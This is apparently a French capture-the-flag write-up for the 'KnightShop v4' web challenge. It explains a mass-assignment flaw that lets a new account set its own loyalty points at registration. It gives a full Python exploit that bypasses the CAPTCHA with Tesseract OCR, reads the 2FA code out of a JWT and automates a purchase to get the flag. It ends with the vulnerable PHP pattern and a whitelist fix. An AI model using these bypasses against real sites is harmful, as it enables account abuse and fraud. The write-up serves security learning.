# KnightShop v4 — Web

**URL :** `http://95.216.124.220:30470/`  
**Flag :** `CCOI26{m4ss_4ss1gnm3nt_1s_ReAlLy_d4ng3r0us}`

---

## Contexte

V4 reprend exactement les mêmes mécanismes de protection que v3 (CAPTCHA + code d'inscription + 2FA via JWT) et ajoute un système de **loyalty points**. Chaque article sur le dashboard coûte **500 points**, et un compte fraîchement créé commence à **0**. Sans points, `purchase.php` redirige silencieusement vers le dashboard — impossible d'acheter.

L'indice : *"Fortune favors those who question every assumption the kingdom makes about them."*

---

## Reconnaissance

Je commence par regarder `app.js` pour chercher des indices. Il y a plein de leurres — `key_part_2`, `key_part_3`, `key_part_4`, des tokens base64 qui ne décodent rien d'utile, des tableaux de nombres aléatoires. La seule chose réelle : `buildRegCode()` retourne toujours `key_part_1` directement, donc le code d'inscription est le même `I_Am_Knight` de v2.

Autre truc bizarre dans le JS : un event listener sur `id="registerForm"` qui n'existe pas dans `register.php`, et qui pointe vers `register_handler.php` qui fait 404. C'est des dead-ends voulus pour faire perdre du temps.

Je passe quelques heures à essayer des trucs qui ne marchent pas : injection SQL dans les champs, manipulation du JWT, race condition sur `purchase.php`, cookies avec des points injectés... Rien.

Finalement je relis l'indice — *"question every assumption"* — et je me demande : qu'est-ce que le serveur assume sur les données d'inscription ? Il assume que je vais envoyer uniquement `username`, `email`, `password`, `registration_code`, `captcha`. Et si j'envoyais un champ en plus ?

---

## Mass Assignment

Je teste en ajoutant `loyalty_points=500` au POST d'inscription :

```python
r = s.post(f'{BASE}/register.php', data={
    'username':          'test',
    'email':             'test@pwn.io',
    'password':          'Str0ng!Pass1',
    'registration_code': 'I_Am_Knight',
    'captcha':           cap,
    'loyalty_points':    '500',   # champ supplémentaire
})
```

Après login et 2FA, le dashboard affiche **500 points**. Le serveur a directement utilisé la valeur qu'on lui a envoyée pour initialiser le champ `loyalty_points` dans la base de données.

C'est une faille de **mass assignment** : le PHP du backend prend `$_POST` et l'applique directement sur l'objet utilisateur sans whitelist des champs autorisés.

---

## Exploitation complète

```python
#!/usr/bin/env python3
import requests, re, io, subprocess, numpy as np, base64, json, string, random
from PIL import Image

BASE = 'http://95.216.124.220:30470'

def ocr_captcha(s):
    r = s.get(f'{BASE}/captcha.php')
    img = Image.open(io.BytesIO(r.content)).convert('L')
    arr = np.array(img)
    clean = np.where(arr == 200, 255, 0).astype(np.uint8)
    big = Image.fromarray(clean, 'L').resize((1200, 400), Image.NEAREST)
    big.save('/tmp/cap.png')
    for psm in [7, 8, 6]:
        res = subprocess.run(
            ['tesseract', '/tmp/cap.png', 'stdout', '--psm', str(psm),
             '-c', 'tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'],
            capture_output=True, text=True)
        txt = res.stdout.strip()
        if txt and 4 <= len(txt) <= 8:
            return txt
    return res.stdout.strip()

def decode_jwt(token):
    p = token.split('.')[1]
    p += '=' * (-len(p) % 4)
    return json.loads(base64.b64decode(p))

for _ in range(50):
    s = requests.Session()
    user  = 'atk' + ''.join(random.choices(string.digits, k=6))
    email = user + '@pwn.io'

    cap = ocr_captcha(s)
    reg = s.post(f'{BASE}/register.php', data={
        'username':          user,
        'email':             email,
        'password':          'Str0ng!Pass1',
        'registration_code': 'I_Am_Knight',
        'captcha':           cap,
        'loyalty_points':    '500',   # mass assignment
    }, allow_redirects=True)
    if 'captcha' in reg.text.lower():
        continue

    # login
    lp   = s.get(f'{BASE}/login.php')
    csrf = re.search(r'name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']', lp.text).group(1)
    s.post(f'{BASE}/login.php', data={
        'email': email, 'password': 'Str0ng!Pass1',
        'website': '', 'csrf_token': csrf
    }, allow_redirects=False)

    # 2FA depuis le JWT (même technique que v3)
    otp = decode_jwt(s.cookies.get('knight_token'))['2fa_token']
    s.post(f'{BASE}/verify_2fa.php', data={'otp': otp}, allow_redirects=True)

    # récupérer le CSRF du dashboard et acheter
    d    = s.get(f'{BASE}/dashboard.php')
    csrf = re.search(r'name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']', d.text).group(1)
    r    = s.post(f'{BASE}/purchase.php', data={'product_id': '1', 'csrf_token': csrf}, allow_redirects=True)

    flags = re.findall(r'CCOI26\{[^}]+\}', r.text)
    if flags:
        print(f'FLAG: {flags[0]}')
        break
```

Output :
```
FLAG: CCOI26{m4ss_4ss1gnm3nt_1s_ReAlLy_d4ng3r0us}
```

---

## Pourquoi ça marche

Le backend PHP (ou son ORM) applique probablement tous les paramètres POST directement sur l'objet utilisateur avant insertion en base :

```php
// code vulnérable (type)
$user = new User($_POST);
$user->save();
```

Le fix c'est de whitelister les champs qu'on accepte à la création :

```php
$user = new User([
    'username'       => $_POST['username'],
    'email'          => $_POST['email'],
    'password'       => hash_password($_POST['password']),
    'loyalty_points' => 0,  // toujours 0 à l'inscription
]);
```

---

## Récap des techniques

- Code d'inscription `I_Am_Knight` — hérité de v2 (indices sur `key_part_1`)
- CAPTCHA — même méthode que v2/v3 (isolation pixel 200 + Tesseract)
- 2FA — même que v3 (OTP dans le payload JWT)
- **Mass Assignment** — `loyalty_points=500` dans le POST d'inscription
- Achat — CSRF token extrait du dashboard

**Flag : `CCOI26{m4ss_4ss1gnm3nt_1s_ReAlLy_d4ng3r0us}`**
